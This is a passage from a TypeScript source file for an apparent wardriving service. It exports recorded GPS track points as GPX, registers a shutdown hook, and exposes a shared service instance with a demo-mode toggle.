    const pts = driveDb.trackPoints(sessionId);
    if (pts.length === 0) return null;
    const lines: string[] = [
      `<?xml version="1.0" encoding="UTF-8"?>`,
      `<gpx version="1.1" creator="akbal-pi wardrive" xmlns="http://www.topografix.com/GPX/1/1">`,
      `  <trk><name>${sessionId}</name><trkseg>`,
    ];
    for (const p of pts) {
      lines.push(`    <trkpt lat="${p.lat.toFixed(6)}" lon="${p.lon.toFixed(6)}"><time>${new Date(p.ts).toISOString()}</time></trkpt>`);
    }
    lines.push(`  </trkseg></trk>`, `</gpx>`);
    return lines.join("\n");
  }

  // ─── Shutdown ──────────────────────────────────────────────────────────

  registerShutdown(): void {
    registerShutdownHook(async () => {
      if (!this.running) return;
      await this.stopInternal(false);
    });
  }

  private broadcastStatus(): void {
    this.emit("status", this.getStatus());
  }
}

// Single shared instance — the wardrive owns the only monitor radio while a
// session runs; everything else is read-only over it.
const sharedDriveWardriveService = new DriveWardriveService();

export function getDriveWardriveService(): DriveWardriveService {
  return sharedDriveWardriveService;
}

// Demo-mode re-export for the platform toggle (utils/platform-mode.ts):
export function driveWardriveSetDemo(demo: boolean): void {
  sharedDriveWardriveService.setDemoMode(demo);
}
function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
